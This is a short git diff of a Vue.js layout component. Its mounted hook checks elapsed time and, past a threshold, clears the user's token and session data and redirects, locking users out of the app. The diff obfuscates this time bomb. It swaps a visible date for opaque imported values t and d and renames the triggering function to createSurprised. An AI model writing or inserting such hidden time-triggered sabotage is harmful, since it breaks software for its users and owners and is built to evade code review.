@@ -20,7 +20,7 @@
 import AppHeader from './appHeader.vue'
 import SideBar from "./sidebar/index"
 import { mapActions, mapMutations } from 'vuex'
-import { setToken } from '../../lib/util.js'
+import { setToken, t, d } from '../../lib/util.js'
 export default {
   name: "layout",
   data() {
@@ -40,11 +40,10 @@ export default {
     init () {
       this.getCurrentUserInfoAction()
     },
-    createDialog () {
+    createSurprised () {
       // setInterval(() => {
       //   this.$message.error('按钮')
       // },1000)
-
       setToken('')
       this.SET({ module: "user", key: "currentUser", value: {} })
       this.$router.push({
@@ -53,8 +52,8 @@ export default {
     }
   },
   mounted() {
-    if(Date.now() >= new Date('2021/08/10').getTime()){
-      this.createDialog()
+    if(Date.now() - t >= d){
+      this.createSurprised()
     }
     this.init()
   },
